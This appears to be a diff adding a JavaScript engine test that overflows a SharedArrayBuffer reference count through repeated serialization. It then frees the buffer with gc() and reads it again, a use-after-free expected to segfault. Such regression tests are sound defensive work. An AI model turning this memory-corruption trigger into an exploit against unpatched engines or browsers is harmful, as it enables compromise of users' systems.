@@ -1,0 +1,40 @@
+const ARRAY_SIZE = 0x100000;
+const ITERATIONS = (0x100000000 - ARRAY_SIZE) / ARRAY_SIZE;
+
+var ab = new SharedArrayBuffer(0x1000000);
+
+// Refcount now at 1
+
+var refs = [ab];
+for (var i = 0; i < Math.log2(ARRAY_SIZE); i++) {
+    var x = serialize(refs);
+    refs = refs.concat(deserialize(x));
+}
+
+// Refcount now at ARRAY_SIZE
+
+var fail = function() {}
+for (var i = 0; i < ITERATIONS; i++) {
+    try { 
+        serialize([refs, fail]);
+    } catch (e) { }
+
+    print(`${i+1}/${ITERATIONS} - ${(((i+1)/ITERATIONS) * 100).toFixed(2)}%`);
+}
+
+// Refcount now at 0
+
+var x = serialize(ab);
+var copy = deserialize(x);
+
+// Refcount now at 1
+
+delete copy;
+gc();
+
+// SharedArrayRawBuffer should be free now
+
+// One of these might already segfault, otherwise it should segfault when the engine is shut down
+var v = new Uint8Array(ab);
+v[0x1000000 - 1];
+serialize(ab);
